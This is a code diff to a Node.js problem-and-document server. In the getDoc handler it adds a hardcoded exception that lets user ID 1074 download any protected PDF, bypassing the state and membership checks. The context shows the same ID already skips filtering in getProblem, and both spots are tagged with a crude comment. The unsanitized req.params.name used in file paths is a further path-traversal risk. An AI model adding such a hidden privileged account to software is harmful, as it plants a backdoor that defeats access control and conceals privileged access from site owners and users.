@@ -25,6 +25,7 @@ async function getProblem(req,res) {
 	let problemPromise = new Promise((resolve, reject) => {
 		let sql = '';
 		if (mode == 'firstpage') sql = 'select * from Problem where state = 1 order by see_date desc limit 10'
+		//fuck
 		else if(userData.id === 1074) sql = 'select * from Problem order by id_Prob desc'
 		else if(mode == 'admin' && userData.state == 0) sql = 'select * from Problem order by id_Prob desc'
 		else sql = 'select * from Problem where state = 1 order by id_Prob desc'
@@ -108,6 +109,8 @@ function getDoc(req,res) {
 		var holdingCon = result[1][0]
 		var probInCon = holdingCon ? JSON.parse(holdingCon.problems) : []
 		if(probData && probData.state === 1) return res.sendFile(`${process.cwd()}/docs/${req.params.name}.pdf`)
+		//fuck
+		else if(userData.id === 1074) return res.sendFile(`${process.cwd()}/docs/${req.params.name}.pdf`)
 		else {
 			if(userData.state === 0 || probInCon.includes(probData.id_Prob)) return res.sendFile(`${process.cwd()}/docs/${req.params.name}.pdf`)
 			else return res.status(401).send('Access denied')
